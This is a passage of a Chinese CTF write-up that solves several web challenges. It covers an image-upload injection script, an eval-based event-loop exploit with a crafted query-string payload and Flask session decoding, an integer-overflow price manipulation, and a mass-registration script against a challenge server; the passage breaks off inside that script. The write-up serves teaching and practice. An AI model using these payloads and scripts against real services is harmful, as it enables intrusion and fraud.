class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(isset($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = '';</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>用生成的图片上传，然后下载下来检查语句是否写入成功</p>
<p><img src="https://i.loli.net/2019/07/09/5d24758d1c86157114.png" alt="5.png"></p>
<p><strong><em>写入成功~</em></strong></p>
<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>打开后是四个超链接和一个提示：<code>[INFO] you have 0 diamonds, 3 points now.</code>，大致功能就是可以查看源码，然后用积分买钻石。</p>
<p><img src="https://i.loli.net/2019/07/10/5d2605232983656770.png" alt="展示界面"></p>
<p>每个链接都试了一下，没什么特别的，直接审计源码</p>
<h3 id="审计源码-1"><a href="#审计源码-1" class="headerlink" title="审计源码"></a>审计源码</h3><p>server.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5af31f86147e857'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行该函数会输出flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将传入的参数存入队列中，固定保留后5个</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">	session[<span class="string">'log'</span>].append(event)</span><br><span class="line">	<span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">	<span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">		request.event_queue += event</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回 prefix 与 postfix 中间的字符串(postfix != None)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">	haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">	<span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">	<span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环执行 trigger_event()传入队列的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">	valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">    <span class="comment"># 设置输入字符白名单</span></span><br><span class="line">	resp = <span class="literal">None</span></span><br><span class="line">	<span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 队列向后推进一个队列成员的方法</span></span><br><span class="line">		event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">		request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        </span><br><span class="line">       <span class="comment"># 必须以'action'/'func'开头</span></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">			<span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">			action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)  <span class="comment"># 获取需要执行的函数名</span></span><br><span class="line">			args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)  <span class="comment"># 获取参数</span></span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 关键代码：函数执行</span></span><br><span class="line">				event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">				ret_val = event_handler(args)</span><br><span class="line">			<span class="keyword">except</span> RollBackException:</span><br><span class="line">				<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">				resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">				resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">				session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">				session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">except</span> Exception, e:</span><br><span class="line">				<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">				<span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">				<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line">				<span class="keyword">else</span>: resp += ret_val</span><br><span class="line">	<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">	session.modified = <span class="literal">True</span></span><br><span class="line">	<span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只有唯一一个路由，为程序入口</span></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">	querystring = urllib.unquote(request.query_string)</span><br><span class="line">	request.event_queue = []</span><br><span class="line">	<span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">		querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">		session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">		session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">		session[<span class="string">'log'</span>] = []</span><br><span class="line">	request.prev_session = dict(session)</span><br><span class="line">	trigger_event(querystring)</span><br><span class="line">	<span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	page = args[<span class="number">0</span>]</span><br><span class="line">	html = <span class="string">''</span></span><br><span class="line">	html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">	<span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">	<span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">	<span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">		<span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">		html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">	html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">	<span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">	bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line"></span><br><span class="line">		source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">		html = <span class="string">''</span></span><br><span class="line">		<span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">			html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">			html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">			<span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">				html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				html += line</span><br><span class="line">		source.close()</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">			headers = &#123;&#125;</span><br><span class="line">			headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">			headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">			<span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> html</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加diamonds数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	num_items = int(args[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">	session[<span class="string">'num_items'</span>] += num_items</span><br><span class="line">    <span class="comment"># 注意这里会调用下面的函数，直接增加diamonds会导致下面的函数抛出异常</span></span><br><span class="line">	trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消耗points数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">	point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">	session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"><span class="comment"># 没用的显示flag函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">	flag = args[<span class="number">0</span>]</span><br><span class="line">	<span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当diamonds &gt; 5 时将flag存入队列中</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">		trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">	trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p><strong>上面的代码最好自行审计一遍。</strong></p>
<h3 id="关键逻辑"><a href="#关键逻辑" class="headerlink" title="关键逻辑"></a>关键逻辑</h3><p>通过适当构造传参我们可以实现函数执行。</p>
<p>注意这里限制了函数名，可以通过<code>#</code>来注释掉后面的后缀。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关键代码：函数执行</span></span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">ret_val = event_handler(args)</span><br></pre></td></tr></table></figure>



<p>由于有get_flag_handler()函数，可以考虑是否能让<code>num_items &gt; 5</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 增加diamonds数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	num_items = int(args[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">	session[<span class="string">'num_items'</span>] += num_items</span><br><span class="line">    <span class="comment"># 注意这里会调用下面的函数，直接增加diamonds会导致下面的函数抛出异常</span></span><br><span class="line">	trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消耗points数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">	point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">	session[<span class="string">'points'</span>] -= point_to_consume</span><br></pre></td></tr></table></figure>





<p>注意到我们可以执行程序中的任何一个带参函数，所以也包括添加队列的<code>trigger_event()</code>，<strong>这里一种思路就是增加两个假队列成员，分别执行buy、get_flag两个函数，在consume_point抛出错误之前输出flag</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将传入的参数存入队列中，固定保留后5个</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">	session[<span class="string">'log'</span>].append(event)</span><br><span class="line">	<span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">	<span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">		request.event_queue += event</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		request.event_queue.append(event)</span><br></pre></td></tr></table></figure>

<p>Payload：<code>?action:trigger_event%23;action:buy;10%23action:get_flag;</code></p>
<p>然后抓包解密session即可。</p>
<p><img src="https://i.loli.net/2019/07/11/5d260fe1ace2c70074.png" alt="session效果图"></p>
<h3 id="Flask-cookie-session"><a href="#Flask-cookie-session" class="headerlink" title="Flask cookie-session"></a>Flask cookie-session</h3><p>Flask框架下，session是储存在客户端的，虽然使用签名处理过防止被篡改，但是却没有对session进行加密操作，这导致敏感信息泄露。</p>
<p>前面通过Payload打一发，得到了含有flag的session，这里使用<strong>@离别歌</strong>大佬的脚本解密得到flag。</p>
<p><img src="https://i.loli.net/2019/07/11/5d261087158a983187.png" alt="flag效果图"></p>
<h2 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h2><p>登录注册，账户里只有100金币，要2000金币买ticket (怎么没有充值入口</p>
<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>截取添加订单的请求包，发现ticket_price字段，且ticket_price是可控的：</p>
<p><img src="https://i.loli.net/2019/07/11/5d26155c0202658527.png" alt="ticket_price"></p>
<p>经过尝试后发现只能是大于2000的整数，那么考虑整数溢出。</p>
<p>32位操作系统的最大整数为4294967295，确保万无一失我们改为4294967296，购买成功。</p>
<p><img src="https://i.loli.net/2019/07/11/5d2616954110f60879.png" alt="购买成功"></p>
<h3 id="脚本踢人"><a href="#脚本踢人" class="headerlink" title="脚本踢人"></a>脚本踢人</h3><p>直接上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">regist = <span class="string">"http://117.51.147.155:5050/ctf/api/register?password=11111111&amp;name=vvvvwwwcvv"</span><span class="comment">#name添加一个前缀</span></span><br><span class="line">buy_ticket = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"</span></span><br><span class="line">pay_ticket = <span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="</span></span><br><span class="line">delete = <span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot"</span></span><br><span class="line">get_flag=<span class="string">"http://117.51.147.155:5050/ctf/api/get_flag"</span></span><br><span class="line"></span><br><span class="line">i= <span class="number">999883</span>                                                       <span class="comment">#初始化用户名,使用未注册过的数字</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_robot</span><span class="params">(player_id, player_ticket)</span>:</span></span><br><span class="line">    COOKIE = &#123;<span class="string">"Cookie"</span>: <span class="string">"user_name= fsdaaaaaaaaaaaa; REVEL_SESSION=ca8bd90e72a2844c1f1db795f1d92a88"</span>&#125;               <span class="comment">#修改为自己主账户的cookie</span></span><br><span class="line">    param=&#123;<span class="string">"id"</span>:player_id,<span class="string">"ticket"</span>:player_ticket&#125;</span><br><span class="line">    requests.get(delete,params=param, headers=COOKIE)               <span class="comment">#删除id</span></span><br><span class="line">    flag = requests.get(get_flag, headers=COOKIE)                   <span class="comment">#获取剩余的敌人数量</span></span><br><span class="line">    print(flag.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = requests.session()</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    r = t.get(regist + str(i))                      <span class="comment">#注册</span></span><br><span class="line">    r = t.get(buy_ticket).json()                    <span class="comment">#购买Ticket，解析json</span></span><br><span class="line">    bill_id = r[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"bill_id"</span>]               <span class="comment">#json解析bill_id</span></span><br><span class="line">    r = t.get(pay_ticket + bill_id).json()          <span class="comment">#支付订单</span></span><br><span class="line">    player_id = r[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"your_id"</span>]</span><br><span class="line">    player_ticket = r[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"your_ticket"</span>]     <span class="comment">#json解析id与ticket</span></span><br><span class="line">    